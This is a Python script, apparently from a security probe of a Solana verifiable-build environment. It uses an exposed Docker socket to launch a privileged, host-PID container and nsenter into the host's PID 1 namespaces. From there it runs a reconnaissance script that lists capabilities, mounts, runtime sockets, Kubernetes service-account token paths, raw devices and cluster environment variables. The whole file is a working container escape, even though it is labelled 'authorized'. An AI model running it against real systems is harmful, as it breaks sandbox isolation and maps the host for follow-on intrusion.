#!/usr/bin/env python3
"""Report non-secret metadata from Docker-daemon PID 1's namespaces."""

import http.client
import json
import socket
import urllib.parse
import uuid


SOCKET = "/build/var/run/docker.sock"
IMAGE = (
    "solanafoundation/solana-verifiable-build@"
    "sha256:db18b91d21866286019b0f1e4fc92967e6ebda0ae0a5575dbb273964a3dc62cb"
)


class UnixHTTPConnection(http.client.HTTPConnection):
    def __init__(self):
        super().__init__("localhost", timeout=30)

    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect(SOCKET)


def request(method, path, body=None, expected=(200, 201, 204)):
    connection = UnixHTTPConnection()
    encoded = None if body is None else json.dumps(body).encode()
    headers = {"Content-Type": "application/json"} if encoded else {}
    connection.request(method, path, encoded, headers)
    response = connection.getresponse()
    response_body = response.read()
    connection.close()
    if response.status not in expected:
        raise RuntimeError(
            f"Docker API {method} {path}: {response.status} "
            f"{response_body.decode(errors='replace')}"
        )
    return response_body


def main():
    name = "otter-host-identity-" + uuid.uuid4().hex
    quoted_name = urllib.parse.quote(name, safe="")
    probe = r'''
printf 'probe_version=2\n'
printf 'identity='; id
printf 'whoami='; whoami
printf 'hostname='; hostname
printf 'kernel='; uname -a
printf 'pid1_cmdline='; tr '\000' ' ' </proc/1/cmdline; printf '\n'
printf 'os_release='; grep -E '^(ID|VERSION_ID|PRETTY_NAME)=' /etc/os-release 2>/dev/null | tr '\n' ';'; printf '\n'
printf '%s\n' '[pid1_status]'
grep -E '^(Name|Uid|Gid|NSpid|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp):' /proc/1/status 2>/dev/null || true
printf '%s\n' '[self_status]'
grep -E '^(Name|Uid|Gid|NSpid|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp):' /proc/self/status 2>/dev/null || true
printf '%s\n' '[namespaces]'
for namespace in cgroup ipc mnt net pid time user uts; do
    printf '%s=' "$namespace"
    readlink "/proc/1/ns/$namespace" 2>/dev/null || printf 'unavailable\n'
done
printf '%s\n' '[cgroup]'
sed -n '1,40p' /proc/1/cgroup 2>/dev/null || true
printf '%s\n' '[root_mount]'
findmnt -n -o TARGET,SOURCE,FSTYPE,OPTIONS / 2>/dev/null || true
printf '%s\n' '[selected_mounts]'
findmnt -rn -o TARGET,SOURCE,FSTYPE,OPTIONS 2>/dev/null \
    | grep -E '(^/($| )|docker|container|kube|serviceaccount|/run|/var/run|overlay)' \
    | sed -n '1,100p' || true
printf '%s\n' '[selected_paths]'
for path in \
    /var/run/docker.sock \
    /run/containerd/containerd.sock \
    /var/run/containerd/containerd.sock \
    /var/run/crio/crio.sock \
    /var/run/secrets/kubernetes.io/serviceaccount \
    /var/run/secrets/kubernetes.io/serviceaccount/token \
    /var/run/secrets/kubernetes.io/serviceaccount/namespace \
    /dev/kmsg /dev/mem /dev/sda /dev/nvme0n1; do
    if [ -e "$path" ]; then
        stat -Lc 'present path=%n type=%F mode=%a uid=%u gid=%g' "$path" 2>/dev/null || true
    else
        printf 'absent path=%s\n' "$path"
    fi
done
if [ -r /var/run/secrets/kubernetes.io/serviceaccount/namespace ]; then
    printf 'kubernetes_namespace='; sed -n '1p' /var/run/secrets/kubernetes.io/serviceaccount/namespace
fi
printf '%s\n' '[kubernetes_service_env]'
tr '\000' '\n' </proc/1/environ 2>/dev/null \
    | grep -E '^KUBERNETES_SERVICE_(HOST|PORT)=' || true
printf 'apparmor='; cat /proc/self/attr/current 2>/dev/null || printf 'unavailable\n'
'''
    body = {
        "Image": IMAGE,
        "Cmd": [
            "/usr/bin/nsenter",
            "-t",
            "1",
            "-m",
            "-u",
            "-i",
            "-n",
            "-p",
            "--",
            "/bin/sh",
            "-c",
            probe,
        ],
        "Tty": True,
        "HostConfig": {"Privileged": True, "PidMode": "host"},
        "Labels": {"purpose": "authorized-otter-host-identity-probe"},
    }

    created = False
    try:
        request("POST", f"/v1.41/containers/create?name={quoted_name}", body, (201,))
        created = True
        request("POST", f"/v1.41/containers/{quoted_name}/start", expected=(204,))
        request(
            "POST",
            f"/v1.41/containers/{quoted_name}/wait?condition=not-running",
            expected=(200,),
        )
        logs = request(
            "GET",
            f"/v1.41/containers/{quoted_name}/logs?stdout=1&stderr=1",
            expected=(200,),
        )
        print(logs.decode(errors="replace").strip())
    finally:
        if created:
            request(
                "DELETE",
                f"/v1.41/containers/{quoted_name}?force=1&v=1",
                expected=(204,),
            )


if __name__ == "__main__":
    main()
